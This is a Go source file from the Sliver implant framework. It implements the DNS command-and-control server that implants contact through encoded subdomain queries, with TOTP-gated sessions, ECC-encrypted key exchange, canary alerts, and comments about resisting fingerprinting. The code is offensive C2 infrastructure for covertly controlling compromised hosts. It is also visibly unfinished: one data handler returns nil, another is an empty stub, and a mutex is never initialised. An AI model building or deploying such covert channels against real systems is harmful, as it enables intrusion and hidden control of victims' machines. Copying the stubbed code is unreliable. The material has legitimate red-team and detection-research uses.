package c2

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.

	------------------------------------------------------------------------

	We've put a little effort to making the server at least not super easily fingerprintable,
	though I'm guessing it's also still not super hard to do. The server must receive a valid
	TOTP code before we start returning any non-error records. All requests must be formatted
	as valid protobuf and contain a 24-bit "dns session ID" (16777216 possible values), and a
	8 bit "message ID." The server only responds to non-TOTP queries with valid dns session IDs
	16,777,216 can probably be bruteforced but it'll at least be slow.

	DNS command and control outline:
		1. Implant sends TOTP encoded message to DNS server, server checks validity
		2. DNS server responds with the "DNS Session ID" which is just some random value
		3. Requests with valid DNS session IDs enable the server to respond with CRC32 responses
		4. Implant establishes encrypted session

*/

import (
	secureRand "crypto/rand"
	"errors"
	"hash/crc32"
	"unicode"

	"github.com/bishopfox/sliver/protobuf/dnspb"
	"github.com/bishopfox/sliver/server/cryptography"
	"github.com/bishopfox/sliver/server/db"
	"github.com/bishopfox/sliver/server/generate"
	"github.com/bishopfox/sliver/util/encoders"
	"google.golang.org/protobuf/proto"

	"encoding/base64"
	"encoding/binary"

	"fmt"
	"strings"
	"sync"
	"time"

	consts "github.com/bishopfox/sliver/client/constants"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/log"
	"github.com/emirpasic/gods/lists/singlylinkedlist"

	"github.com/miekg/dns"
)

const (
	// Little endian
	sessionIDBitMask = 0x00ffffff // Bitwise mask to get the dns session ID
	messageIDBitMask = 0xff000000 // Bitwise mask to get the message ID
)

var (
	dnsLog = log.NamedLogger("c2", "dns")

	implantBase64 = encoders.Base64{} // Implant's version of base64 with custom alphabet

	ErrInvalidMsg = errors.New("invalid dns message")
)

// StartDNSListener - Start a DNS listener
func StartDNSListener(bindIface string, lport uint16, domains []string, canaries bool) *SliverDNSServer {
	// StartPivotListener()
	server := &SliverDNSServer{
		server:          &dns.Server{Addr: fmt.Sprintf("%s:%d", bindIface, lport), Net: "udp"},
		sessions:        &sync.Map{}, // DNS Session ID -> DNSSession
		messages:        &sync.Map{}, // In progress message streams
		totpToSessionID: &sync.Map{}, // Atomic TOTP -> DNS Session ID
		TTL:             0,
	}
	dnsLog.Infof("Starting DNS listener for %v (canaries: %v) ...", domains, canaries)
	dns.HandleFunc(".", func(writer dns.ResponseWriter, req *dns.Msg) {
		started := time.Now()
		server.HandleDNSRequest(domains, canaries, writer, req)
		dnsLog.Debugf("DNS server took %s", time.Since(started))
	})
	return server
}

// DNSSession - Holds DNS session information
type DNSSession struct {
	ID               uint32
	Session          *core.Session
	CipherCtx        *cryptography.CipherContext
	pendingEnvelopes map[uint32]*PendingEnvelope
	mutex            sync.Mutex
}

// GetPending - Get a pending message linked list, creates one if it doesn't exist
func (s *DNSSession) GetPending(dnsMsg *dnspb.DNSMessage) *PendingEnvelope {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	if pendingMsg, ok := s.pendingEnvelopes[dnsMsg.ID]; ok {
		return pendingMsg
	}
	linkedList := singlylinkedlist.New()
	linkedList.Sort(func(left, right interface{}) int {
		leftAssert := left.(*dnspb.DNSMessage)
		rightAssert := right.(*dnspb.DNSMessage)
		if leftAssert.Start > rightAssert.Start {
			return 1
		} else {
			return -1
		}
	})
	pendingMsg := &PendingEnvelope{
		Size:     dnsMsg.Size,
		messages: linkedList,
	}
	s.pendingEnvelopes[dnsMsg.ID] = pendingMsg
	return pendingMsg
}

// PendingEnvelope - Holds data related to a pending message
type PendingEnvelope struct {
	Size     uint32
	received uint32
	messages *singlylinkedlist.List
	mutex    *sync.Mutex
}

// Insert - Pending message, returns true if message is complete
func (p *PendingEnvelope) Insert(dnsMsg *dnspb.DNSMessage) bool {
	p.mutex.Lock()
	defer p.mutex.Unlock()
	iter := p.messages.Iterator()
	p.received += uint32(len(dnsMsg.Data))
	for iter.Next() {
		if iter.Value().(*dnspb.DNSMessage).Start > dnsMsg.Start {
			p.messages.Insert(iter.Index(), dnsMsg)
			return p.received >= p.Size
		}
	}
	p.messages.Append(dnsMsg)
	return p.received >= p.Size
}

// --------------------------- DNS SERVER ---------------------------

// SliverDNSServer - DNS server implementation
type SliverDNSServer struct {
	server          *dns.Server
	sessions        *sync.Map
	messages        *sync.Map
	totpToSessionID *sync.Map
	TTL             uint32
}

// Shutdown - Shutdown the DNS server
func (s *SliverDNSServer) Shutdown() error {
	return s.server.Shutdown()
}

// ListenAndServe - Listen for DNS requests and respond
func (s *SliverDNSServer) ListenAndServe() error {
	return s.server.ListenAndServe()
}

// ---------------------------
// DNS Handler
// ---------------------------
// Handles all DNS queries, first we determine if the query is C2 or a canary
func (s *SliverDNSServer) HandleDNSRequest(domains []string, canaries bool, writer dns.ResponseWriter, req *dns.Msg) {
	if req == nil {
		dnsLog.Info("req can not be nil")
		return
	}

	if len(req.Question) < 1 {
		dnsLog.Info("No questions in DNS request")
		return
	}

	var resp *dns.Msg
	isC2, domain := s.isC2SubDomain(domains, req.Question[0].Name)
	if isC2 {
		dnsLog.Debugf("'%s' is subdomain of c2 parent '%s'", req.Question[0].Name, domain)
		resp = s.handleC2(domain, req)
	} else if canaries {
		dnsLog.Debugf("checking '%s' for DNS canary matches", req.Question[0].Name)
		resp = s.handleCanary(req)
	}
	if resp != nil {
		writer.WriteMsg(resp)
	} else {
		dnsLog.Infof("Invalid query, no DNS response")
	}
}

// Returns true if the requested domain is a c2 subdomain, and the domain it matched with
func (s *SliverDNSServer) isC2SubDomain(domains []string, reqDomain string) (bool, string) {
	for _, parentDomain := range domains {
		if dns.IsSubDomain(parentDomain, reqDomain) {
			dnsLog.Infof("'%s' is subdomain of '%s'", reqDomain, parentDomain)
			return true, parentDomain
		}
	}
	dnsLog.Infof("'%s' is NOT subdomain of any c2 domain %v", reqDomain, domains)
	return false, ""
}

// The query is C2, pass to the appropriate record handler this is done
// so the record handler can encode the response based on the type of
// record that was requested
func (s *SliverDNSServer) handleC2(domain string, req *dns.Msg) *dns.Msg {
	subdomain := req.Question[0].Name[:len(req.Question[0].Name)-len(domain)]
	dnsLog.Debugf("processing req for subdomain = %s", subdomain)
	msg, checksum, err := s.decodeSubdata(subdomain)
	if err != nil {
		dnsLog.Errorf("error decoding subdata: %v", err)
		return s.nameErrorResp(req)
	}

	// TOTP Handler can be called without dns session ID
	if msg.Type == dnspb.DNSMessageType_TOTP {
		return s.handleTOTP(domain, msg, req)
	}
	dnsLog.Debugf("dns session id: %d", msg.ID&sessionIDBitMask)

	// All other handlers require a valid dns session ID
	_, ok := s.sessions.Load(msg.ID & sessionIDBitMask)
	if !ok {
		dnsLog.Warnf("session not found for id %v (%v)", msg.ID, msg.ID&sessionIDBitMask)
		return s.nameErrorResp(req)
	}

	// Msg Type -> Handler
	switch msg.Type {
	case dnspb.DNSMessageType_NOP:
		return s.handleNOP(domain, msg, checksum, req)
	case dnspb.DNSMessageType_INIT:
		return s.handleSessionInit(domain, msg, checksum, req)
	case dnspb.DNSMessageType_DATA_FROM_IMPLANT:
		return s.handleDataFromImplant(domain, msg, checksum, req)
	case dnspb.DNSMessageType_DATA_TO_IMPLANT:
		return s.handleDataToImplant(domain, msg, checksum, req)
	}
	return nil
}

// Parse subdomain as data and calculate the CRC32 checksum, I decided to add the
// checksum calculation here to ensure that no one accidentally calculates the crc32
// of the plaintext data (that would be very bad).
func (s *SliverDNSServer) decodeSubdata(subdomain string) (*dnspb.DNSMessage, uint32, error) {
	subdata := strings.Join(strings.Split(subdomain, "."), "")
	dnsLog.Debugf("subdata = %s", subdata)
	encoders := s.determineLikelyEncoders(subdata)
	for _, encoder := range encoders {
		data, err := encoder.Decode([]byte(subdata))
		if err == nil {
			msg := &dnspb.DNSMessage{}
			err = proto.Unmarshal(data, msg)
			if err == nil {
				return msg, crc32.ChecksumIEEE(data), nil
			}
		}
		dnsLog.Debugf("failed to decode subdata with %#v (%s)", encoder, err)
	}
	return nil, 0, ErrInvalidMsg
}

// Returns the most likely -> least likely encoders, if decoding fails fallback to
// the next encoder until we run out of options.
func (s *SliverDNSServer) determineLikelyEncoders(subdata string) []encoders.Encoder {
	for _, char := range subdata {
		if unicode.IsUpper(char) {
			return []encoders.Encoder{encoders.Base58{}, encoders.Base32{}}
		}
	}
	return []encoders.Encoder{encoders.Base32{}, encoders.Base58{}}
}

func (s *SliverDNSServer) nameErrorResp(req *dns.Msg) *dns.Msg {
	resp := new(dns.Msg)
	resp.SetRcode(req, dns.RcodeNameError)
	resp.Authoritative = true
	return resp
}

func (s *SliverDNSServer) refusedErrorResp(req *dns.Msg) *dns.Msg {
	resp := new(dns.Msg)
	resp.SetRcode(req, dns.RcodeRefused)
	resp.Authoritative = true
	return resp
}

// ---------------------------
// DNS Message Handlers
// ---------------------------
func (s *SliverDNSServer) handleTOTP(domain string, msg *dnspb.DNSMessage, req *dns.Msg) *dns.Msg {
	dnsLog.Debugf("totp request: %v", msg)
	totpCode := fmt.Sprintf("%08d", msg.ID)
	valid, err := cryptography.ValidateTOTP(totpCode)
	if err != nil || !valid {
		dnsLog.Warnf("totp request invalid (%v)", err)
		return s.nameErrorResp(req)
	}
	dnsLog.Debugf("totp request valid")

	// Queries must be deterministic, so create or load the dns session id
	// we'll likely get multiple queries for the same domain
	actualID, loaded := s.totpToSessionID.LoadOrStore(totpCode, dnsSessionID())
	dnsSessionID := actualID.(uint32)
	dnsLog.Debugf("DNS Session ID = %d", dnsSessionID&sessionIDBitMask)
	if !loaded {
		s.sessions.Store(dnsSessionID&sessionIDBitMask, &DNSSession{
			ID: dnsSessionID & sessionIDBitMask,
		})
		go func() {
			time.Sleep(90 * time.Second) // Best effort to remove totp code after expiration
			s.totpToSessionID.Delete(totpCode)
		}()
	}
	resp := new(dns.Msg)
	resp.SetReply(req)
	resp.Authoritative = true
	respBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(respBuf, dnsSessionID)
	for _, q := range req.Question {
		switch q.Qtype {
		case dns.TypeA:
			a := &dns.A{
				Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: s.TTL},
				A:   respBuf,
			}
			resp.Answer = append(resp.Answer, a)
		}
	}
	return resp
}

func (s *SliverDNSServer) handleSessionInit(domain string, msg *dnspb.DNSMessage, checksum uint32, req *dns.Msg) *dns.Msg {
	dnsLog.Debugf("[session init] with dns session id %d", msg.ID&sessionIDBitMask)
	loadSession, _ := s.sessions.Load(msg.ID & sessionIDBitMask)
	dnsSession := loadSession.(*DNSSession)
	if len(msg.Data) <= 32 {
		dnsLog.Warnf("[session init] invalid msg data length")
		return s.refusedErrorResp(req)
	}
	if dnsSession.CipherCtx != nil {
		dnsLog.Warnf("[session init] session is already initialized")
		return s.refusedErrorResp(req)
	}

	var publicKeyDigest [32]byte
	copy(publicKeyDigest[:], msg.Data[:32])
	implantConfig, err := db.ImplantConfigByECCPublicKeyDigest(publicKeyDigest)
	if err != nil || implantConfig == nil {
		dnsLog.Errorf("[session init] error implant public key not found")
		return s.refusedErrorResp(req)
	}
	publicKey, err := base64.RawStdEncoding.DecodeString(implantConfig.ECCPublicKey)
	if err != nil || len(publicKey) != 32 {
		dnsLog.Errorf("[session init] error decoding public key: %s", err)
		return s.refusedErrorResp(req)
	}
	var senderPublicKey [32]byte
	copy(senderPublicKey[:], publicKey)
	serverKeyPair := cryptography.ECCServerKeyPair()
	sessionInit, err := cryptography.ECCDecrypt(&senderPublicKey, serverKeyPair.Private, msg.Data[32:])
	if err != nil {
		dnsLog.Errorf("[session init] error decrypting session init data: %s", err)
		return s.refusedErrorResp(req)
	}
	sessionKey, err := cryptography.KeyFromBytes(sessionInit)
	if err != nil {
		dnsLog.Errorf("[session init] invalid session key: %s", err)
		return s.refusedErrorResp(req)
	}
	dnsSession.CipherCtx = cryptography.NewCipherContext(sessionKey)
	buf := make([]byte, 4)
	binary.LittleEndian.PutUint32(buf, dnsSession.ID)
	respData, err := dnsSession.CipherCtx.Encrypt(buf)
	if err != nil {
		dnsLog.Errorf("[session init] failed to encrypt msg with session key: %s", err)
		return s.refusedErrorResp(req)
	}

	resp := new(dns.Msg)
	resp.SetReply(req)
	resp.Authoritative = true
	for _, q := range req.Question {
		switch q.Qtype {
		case dns.TypeTXT:
			// We're sending back the encrypted dns session id, which is just a uint32
			// so this should basically never be too long.
			respTxt := implantBase64.Encode(respData)
			if 255 < len(respTxt) {
				panic("response text too large")
			}
			txt := &dns.TXT{
				Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: s.TTL},
				Txt: []string{string(respTxt)},
			}
			resp.Answer = append(resp.Answer, txt)
		}
	}
	return resp
}

func (s *SliverDNSServer) handleDataFromImplant(domain string, msg *dnspb.DNSMessage, checksum uint32, req *dns.Msg) *dns.Msg {
	loadSession, _ := s.sessions.Load(msg.ID & sessionIDBitMask)
	dnsSession := loadSession.(*DNSSession)

	pending := dnsSession.GetPending(msg)
	complete := pending.Insert(msg)
	if complete {
		// process complete envelope
	}

	resp := new(dns.Msg)
	resp.SetReply(req)
	for _, q := range req.Question {
		switch q.Qtype {
		case dns.TypeA:
			resp.Authoritative = true
			respBuf := make([]byte, 4)
			binary.LittleEndian.PutUint32(respBuf, checksum)
			a := &dns.A{
				Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: s.TTL},
				A:   respBuf,
			}
			resp.Answer = append(resp.Answer, a)
		}
	}
	return nil
}

func (s *SliverDNSServer) handleDataToImplant(domain string, msg *dnspb.DNSMessage, checksum uint32, req *dns.Msg) *dns.Msg {

	return nil
}

func (s *SliverDNSServer) handleNOP(domain string, msg *dnspb.DNSMessage, checksum uint32, req *dns.Msg) *dns.Msg {
	dnsLog.Debugf("[nop] request checksum: %d", checksum)
	resp := new(dns.Msg)
	resp.SetReply(req)
	resp.Authoritative = true
	respBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(respBuf, checksum)
	for _, q := range req.Question {
		switch q.Qtype {
		case dns.TypeA:
			a := &dns.A{
				Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: s.TTL},
				A:   respBuf,
			}
			resp.Answer = append(resp.Answer, a)
		}
	}
	return resp
}

// ---------------------------
// Canary Record Handler
// ---------------------------
// Canary -> valid? -> trigger alert event
func (s *SliverDNSServer) handleCanary(req *dns.Msg) *dns.Msg {
	// Don't block, return error as fast as possible
	go func() {
		reqDomain := strings.ToLower(req.Question[0].Name)
		if !strings.HasSuffix(reqDomain, ".") {
			reqDomain += "." // Ensure we have the FQDN
		}
		canary, err := db.CanaryByDomain(reqDomain)
		if err != nil {
			dnsLog.Errorf("Failed to find canary: %s", err)
			return
		}
		if canary != nil {
			dnsLog.Warnf("DNS canary tripped for '%s'", canary.ImplantName)
			if !canary.Triggered {
				// Defer publishing the event until we're sure the db is sync'd
				defer core.EventBroker.Publish(core.Event{
					Session: &core.Session{
						Name: canary.ImplantName,
					},
					Data:      []byte(canary.Domain),
					EventType: consts.CanaryEvent,
				})
				canary.Triggered = true
				canary.FirstTrigger = time.Now()
			}
			canary.LatestTrigger = time.Now()
			canary.Count++
			generate.UpdateCanary(canary)
		}
	}()
	return s.nameErrorResp(req)
}

// DNSSessionIDs are public and identify a stream of DNS requests
// the lower 8 bits are the message ID so we chop them off
func dnsSessionID() uint32 {
	randBuf := make([]byte, 4)
	for {
		secureRand.Read(randBuf)
		if randBuf[0] == 0 {
			continue
		}
		if randBuf[len(randBuf)-1] == 0 {
			continue
		}
		break
	}
	dnsSessionID := binary.LittleEndian.Uint32(randBuf)
	return dnsSessionID
}
